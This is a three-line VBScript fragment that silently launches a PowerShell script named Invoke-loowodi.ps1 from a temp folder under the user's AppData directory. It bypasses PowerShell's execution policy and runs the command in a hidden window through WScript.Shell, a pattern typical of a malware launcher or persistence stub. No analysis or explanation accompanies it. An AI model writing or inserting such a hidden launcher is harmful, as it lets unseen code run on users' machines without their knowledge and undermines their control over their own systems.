command = "powershell -nologo -noninteractive -ExecutionPolicy Bypass & '%userprofile%/AppData/Roaming/tempFolder/Invoke-loowodi.ps1'"
set shell = CreateObject("WScript.Shell")
shell.Run command,0, false